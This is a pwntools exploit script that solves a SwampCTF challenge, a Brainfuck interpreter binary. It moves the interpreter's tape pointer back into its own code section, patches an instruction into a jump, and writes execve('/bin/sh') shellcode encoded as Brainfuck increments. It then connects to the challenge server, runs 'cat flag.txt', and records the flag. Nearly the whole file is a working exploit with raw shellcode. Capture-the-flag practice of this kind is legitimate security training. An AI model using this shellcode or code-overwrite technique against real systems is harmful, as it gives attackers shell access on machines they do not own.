from pwn import *

# template from doducphu, this template doesnt work normal in my local, i dont understand why so becareful

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './bf' #change this
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

'''
0:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
7:  73 68 00
a:  53                      push   rbx
b:  48 89 e7                mov    rdi,rsp
e:  5b                      pop    rbx
f:  48 31 d2                xor    rdx,rdx
12: 48 31 f6                xor    rsi,rsi
15: 48 c7 c0 3b 00 00 00    mov    rax,0x3b
1c: 0f 05                   syscall
'''
shellcode = b"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x5B\x48\x31\xD2\x48\x31\xF6\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"

def shellcode2brainfck(s):
	payload = ''
	for i in range(len(s)):
		payload += '+' * s[i]
		payload += '>'
	return payload

# THIS IS ON LOCAC
'''
with open('./braintest', 'w') as fd:
	# change `mov eax, 0x3c` -> `jmp $ + 20`
	# so when rip at 0x4010ac -> jmp to 0x4010c0
    payload = '<' * (0x403800 - 0x4010ac) 
    payload += '+' * (0xeb - 0xb8) # pos = 0x4010ac
    payload += '>'
    payload += '-' * (0x3c - 0x12) # pos = 0x4010ad
    # shellcode at 0x4010c0
    payload += '>' * (0x4010c0 - 0x4010ad) # pos = 0x4010c0
    payload += shellcode2brainfck(shellcode)

    fd.write(payload)

p = start(['./braintest'])
p.interactive()
'''

# THIS IS REMOTE
p = remote("chals.swampctf.com", 41414)

payload = '<' * (0x403800 - 0x4010ac) 
payload += '+' * (0xeb - 0xb8) # pos = 0x4010ac
payload += '>'
payload += '-' * (0x3c - 0x12) # pos = 0x4010ad
# shellcode at 0x4010c0
payload += '>' * (0x4010c0 - 0x4010ad) # pos = 0x4010c0
payload += shellcode2brainfck(shellcode)
p.sendline(payload.encode())

p.sendline(b"q")
p.sendline(b"cat flag.txt")

p.interactive()
#swampCTF{1_W4s_re4L1y_Pr0ud_of_th15_b1N}